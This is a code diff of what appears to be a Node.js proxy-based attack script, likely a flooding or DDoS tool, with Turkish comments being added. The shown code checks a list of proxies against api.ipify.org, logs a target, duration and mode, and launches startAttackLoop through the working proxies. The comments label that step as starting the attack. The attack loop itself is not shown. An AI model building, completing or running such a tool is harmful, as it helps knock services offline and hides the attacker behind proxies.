@@ -39,13 +39,13 @@ async function checkProxies(proxies) {
         try {
             const agent = new HttpsProxyAgent('http://' + proxy);
             await axios.get('https://api.ipify.org', { httpsAgent: agent, timeout: 3000 });
-            working.push(proxy);
+            working.push(proxy); // Proxy çalışıyorsa listeye ekle
         } catch (e) {
-            // Log for failed proxies if necessary
+            // Proxy çalışmıyorsa hata verir ve bir sonraki proxyye geçer
         }
     }
     totalProxies = working.length;
-    return working;
+    return working; // Çalışan proxyler döndürülür
 }
 
 function startPanel() {
@@ -138,8 +138,8 @@ function startAttackLoop(proxies, methodName) {
 (async () => {
     log(`🎯 Hedef: ${target} | Süre: ${duration}s | Mod: ${mode}`, 'green');
     const proxies = readProxies('proxies.txt');
-    const workingProxies = await checkProxies(proxies);
+    const workingProxies = await checkProxies(proxies); // Proxyleri kontrol et
     log(`✅ Çalışan proxy sayısı: ${workingProxies.length}`, 'green');
     startPanel();
-    startAttackLoop(workingProxies, mode);
+    startAttackLoop(workingProxies, mode); // Çalışan proxylerle saldırıyı başlat
 })();
